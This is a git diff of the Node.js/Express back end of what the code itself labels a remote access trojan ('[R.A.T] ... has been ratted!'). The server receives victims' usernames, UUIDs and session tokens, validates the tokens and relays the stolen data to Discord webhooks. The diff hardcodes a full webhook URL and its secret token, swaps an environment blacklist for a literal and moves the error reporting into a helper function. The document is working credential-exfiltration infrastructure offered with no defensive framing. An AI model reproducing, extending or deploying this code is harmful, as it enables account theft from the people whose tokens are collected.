@@ -16,11 +16,20 @@ app.use(expressip().getIpInfoMiddleware) //ip
 app.use(express.json()) //parse json
 app.use(express.urlencoded({ extended: true }))
 
+// Env variables
 // Webhooks
-let defaulthook = process.env.WEBHOOK
-let blackhook = process.env.BLACKHOOK
-let shorthook = process.env.SHORTHOOK
-let debughook = process.env.DEBUGHOOK
+// let defaulthook = process.env.WEBHOOK
+// let blackhook = process.env.BLACKHOOK
+// let shorthook = process.env.SHORTHOOK
+// let debughook = process.env.DEBUGHOOK
+
+let defaulthook = "https://discord.com/api/webhooks/1202990891615129601/bp1uC6m_SkgrlGqkk3nRbBTAN5uCSKvqBnORgheuzBqmUXVbbCkMs2l3dhDVMnpCgQ49"
+let blackhook = "https://discord.com/api/webhooks/1202990891615129601/bp1uC6m_SkgrlGqkk3nRbBTAN5uCSKvqBnORgheuzBqmUXVbbCkMs2l3dhDVMnpCgQ49"
+let shorthook = "https://discord.com/api/webhooks/1202990891615129601/bp1uC6m_SkgrlGqkk3nRbBTAN5uCSKvqBnORgheuzBqmUXVbbCkMs2l3dhDVMnpCgQ49"
+let debughook = "https://discord.com/api/webhooks/1202990891615129601/bp1uC6m_SkgrlGqkk3nRbBTAN5uCSKvqBnORgheuzBqmUXVbbCkMs2l3dhDVMnpCgQ49"
+
+// Blacklist
+let blacklist = "asd" //process.env.BLACKLIST
 
 
 //array initialization
@@ -124,7 +133,7 @@ app.post("/", (req, res) => {
         // Set webhook
         let webhook = defaulthook
 
-        if (process.env.BLACKLIST.split("_").includes(req.body.uuid)) { // debug
+        if (blacklist.split("_").includes(req.body.uuid)) { // debug
             content = `Blacked - <t:${timestamp}:R>`
             webhook = blackhook
         }
@@ -223,16 +232,9 @@ app.post("/", (req, res) => {
                     "Content-Type": "application/json"
                 }
             }).catch(err => {
-                console.log(req.body)
-                post(debughook, JSON.stringify({
-                    content: `[R.A.T] Error while sending to Discord webhook:\n${err}`, //ping
-                    attachments: []
-                }), {
-                    headers: {
-                        "Content-Type": "application/json"
-                    }
-                })
                 console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
+                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
+                console.log(req.body)
             })
 
             post(shorthook, JSON.stringify({
@@ -260,34 +262,21 @@ app.post("/", (req, res) => {
                     "Content-Type": "application/json"
                 }
             }).catch(err => {
-                console.log(req.body)
                 console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                post(debughook, JSON.stringify({
-                    content: `[R.A.T] Error while sending to Discord webhook:\n${err}`, //ping
-                    attachments: []
-                }), {
-                    headers: {
-                        "Content-Type": "application/json"
-                    }
-                })
+                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
+                console.log(req.body)
             })
         } catch (e) {
             console.log(e)
         }
+
         console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
     })
         .catch(err => {
         //could happen if the auth server is down OR if invalid information is passed in the body
         console.log(`[R.A.T] Error while validating token:\n${err}`)
         console.log(req.body)
-        post(debughook, JSON.stringify({
-                content: `[R.A.T] Error while validating token:\n${err}`, //ping
-                attachments: []
-            }), {
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            })
+        sendMessage(`\`\`\`${req.body.username} - ${err}\`\`\``)
     })
     
     //change this to whatever you want, but make sure to send a response
@@ -307,4 +296,17 @@ const formatNumber = (num) => {
     else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
     else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
     else return `${(num / 1000000000).toFixed(2)}b`
+}
+
+function sendMessage(message) {
+    post(debughook, JSON.stringify({
+                content: message, //ping
+                attachments: []
+            }), {
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            }).catch(err => {
+                console.log(`[R.A.T] Error while debugging:\n${err}`)
+            })
 }
